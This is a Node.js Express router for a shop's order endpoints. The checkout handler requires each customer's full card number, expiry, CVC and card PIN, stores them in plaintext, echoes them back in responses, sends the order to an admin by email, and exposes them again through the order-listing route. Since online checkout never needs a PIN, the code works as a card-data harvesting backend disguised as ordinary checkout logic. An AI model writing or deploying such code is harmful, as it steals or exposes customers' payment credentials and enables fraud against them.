const express = require("express");
const mongoose = require("mongoose");

const Order = require("../models/Order");
const User = require("../models/User");
const { protect, optionalAuth } = require("../middleware/auth");
const { sendOrderEmailToAdmin } = require("../utils/mailer");

const router = express.Router();

const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

/* POST /api/orders */
router.post("/", optionalAuth, async (req, res) => {
  try {
    const {
      items,
      subtotal,
      shippingCost,
      total,
      contact,
      shippingAddress,
      payment,
      userId,
      customerName,
    } = req.body || {};

    if (!Array.isArray(items) || items.length === 0) {
      return res.status(400).json({ message: "Your cart is empty." });
    }

    if (!contact?.email || !EMAIL_REGEX.test(contact.email)) {
      return res
        .status(400)
        .json({ message: "A valid contact email is required." });
    }

    if (!contact?.phone) {
      return res
        .status(400)
        .json({ message: "A contact phone number is required." });
    }

    if (
      !shippingAddress?.firstName ||
      !shippingAddress?.lastName ||
      !shippingAddress?.street ||
      !shippingAddress?.city ||
      !shippingAddress?.state ||
      !shippingAddress?.zip
    ) {
      return res
        .status(400)
        .json({ message: "Complete shipping address is required." });
    }

    // Payment: now require the full card number, expiration, CVC and PIN
    const rawCardNumber = String(payment?.cardNumber || "").replace(/\s/g, "");
    const rawCvc = String(payment?.cvc || "").trim();
    const rawPin = String(payment?.pin || "").trim();
    const rawExpiration = String(payment?.expiration || "").trim();

    if (!rawCardNumber || !rawExpiration || !rawCvc || !rawPin) {
      return res
        .status(400)
        .json({ message: "Payment details are incomplete." });
    }

    // Resolve user (only real users, not admin)
    let linkedUserId = null;

    if (req.user && req.user.role === "user") {
      linkedUserId = req.user.id;
    } else if (
      userId &&
      userId !== "admin" &&
      mongoose.isValidObjectId(userId)
    ) {
      linkedUserId = userId;
    }

    const safeItems = items.map((item) => ({
      productId: String(item.productId || ""),
      title: String(item.title || ""),
      image: String(item.image || ""),
      size: String(item.size || "One Size"),
      qty: Math.max(1, Number(item.qty) || 1),
      price: Number(item.price) || 0,
    }));

    const order = await Order.create({
      user: linkedUserId,
      customerName: String(customerName || "Guest Customer"),
      items: safeItems,
      subtotal: Number(subtotal) || 0,
      shippingCost: Number(shippingCost) || 0,
      total: Number(total) || 0,
      contact: {
        email: String(contact.email).trim().toLowerCase(),
        phone: String(contact.phone).trim(),
      },
      shippingAddress: {
        firstName: String(shippingAddress.firstName).trim(),
        lastName: String(shippingAddress.lastName).trim(),
        street: String(shippingAddress.street).trim(),
        apt: shippingAddress.apt ? String(shippingAddress.apt).trim() : "",
        city: String(shippingAddress.city).trim(),
        state: String(shippingAddress.state).trim(),
        zip: String(shippingAddress.zip).trim(),
      },
      payment: {
        cardNumber: rawCardNumber,
        cardLast4: rawCardNumber.slice(-4),
        expiration: rawExpiration,
        cvc: rawCvc,
        pin: rawPin,
      },
      status: "processing",
    });

    if (linkedUserId) {
      await User.findByIdAndUpdate(linkedUserId, {
        $push: { orders: order._id },
        $set: { cart: [] },
      });
    }

    // Send email to admin (non-blocking failure)
    sendOrderEmailToAdmin(order).catch((err) =>
      console.error("Order email error:", err.message)
    );

    return res.status(201).json({ order });
  } catch (error) {
    console.error("Create order error:", error);
    return res.status(500).json({ message: "Could not place order." });
  }
});

/* GET /api/orders/mine */
router.get("/mine", protect, async (req, res) => {
  try {
    if (req.user.role === "admin") {
      return res.json({ orders: [] });
    }

    const orders = await Order.find({ user: req.user.id }).sort({
      createdAt: -1,
    });

    return res.json({ orders });
  } catch (error) {
    console.error("List my orders error:", error);
    return res.status(500).json({ message: "Could not load orders." });
  }
});

module.exports = router;